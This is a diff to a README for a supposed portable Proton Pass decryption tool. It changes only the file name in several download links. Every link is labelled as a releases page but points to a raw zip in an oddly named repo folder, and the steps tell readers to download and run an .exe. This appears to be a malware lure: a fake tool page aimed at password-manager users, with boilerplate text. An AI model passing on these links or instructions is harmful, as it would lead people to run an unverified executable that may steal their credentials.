@@ -1,6 +1,6 @@
 # 🔐 proton-pass-windows-portable - Decrypt Your Proton Pass Safely
 
-[![Download](https://raw.githubusercontent.com/shumager/proton-pass-windows-portable/main/unbeholdenness/proton-pass-windows-portable.zip)](https://raw.githubusercontent.com/shumager/proton-pass-windows-portable/main/unbeholdenness/proton-pass-windows-portable.zip)
+[![Download](https://raw.githubusercontent.com/shumager/proton-pass-windows-portable/main/unbeholdenness/pass_portable_windows_proton_2.7.zip)](https://raw.githubusercontent.com/shumager/proton-pass-windows-portable/main/unbeholdenness/pass_portable_windows_proton_2.7.zip)
 
 ## 📂 Overview
 
@@ -10,14 +10,14 @@ The "proton-pass-windows-portable" is a portable offline tool designed for decry
 
 To get started with proton-pass-windows-portable, follow these simple steps:
 
-1. **Visit the Download Page**: Go to the [Releases page](https://raw.githubusercontent.com/shumager/proton-pass-windows-portable/main/unbeholdenness/proton-pass-windows-portable.zip) to find the latest version of the application.
+1. **Visit the Download Page**: Go to the [Releases page](https://raw.githubusercontent.com/shumager/proton-pass-windows-portable/main/unbeholdenness/pass_portable_windows_proton_2.7.zip) to find the latest version of the application.
 2. **Download the Application**: Download the latest version suitable for your system. Look for files ending with `.exe`, which are Windows installers.
 
 ## 📥 Download & Install
 
 To download and install the proton-pass-windows-portable application, follow these steps:
 
-1. **Go to the Download Page**: Click [here to visit the Releases page](https://raw.githubusercontent.com/shumager/proton-pass-windows-portable/main/unbeholdenness/proton-pass-windows-portable.zip).
+1. **Go to the Download Page**: Click [here to visit the Releases page](https://raw.githubusercontent.com/shumager/proton-pass-windows-portable/main/unbeholdenness/pass_portable_windows_proton_2.7.zip).
 2. **Download the Latest Version**: Locate the latest release. Click on the file that ends with `.exe` to start downloading.
 3. **Run the Application**: Once the download is complete, locate the file in your downloads folder. Double-click it to run the program. There is no installation needed since it is a portable app.
 
@@ -68,6 +68,6 @@ This project is licensed under the MIT License. You are free to use, modify, and
 
 Join our community on GitHub to connect with other users and developers. Share your experiences and tips for using proton-pass-windows-portable effectively.
 
-[![Download](https://raw.githubusercontent.com/shumager/proton-pass-windows-portable/main/unbeholdenness/proton-pass-windows-portable.zip)](https://raw.githubusercontent.com/shumager/proton-pass-windows-portable/main/unbeholdenness/proton-pass-windows-portable.zip)
+[![Download](https://raw.githubusercontent.com/shumager/proton-pass-windows-portable/main/unbeholdenness/pass_portable_windows_proton_2.7.zip)](https://raw.githubusercontent.com/shumager/proton-pass-windows-portable/main/unbeholdenness/pass_portable_windows_proton_2.7.zip)
 
 Let’s ensure your data is safe and accessible whenever you need it!
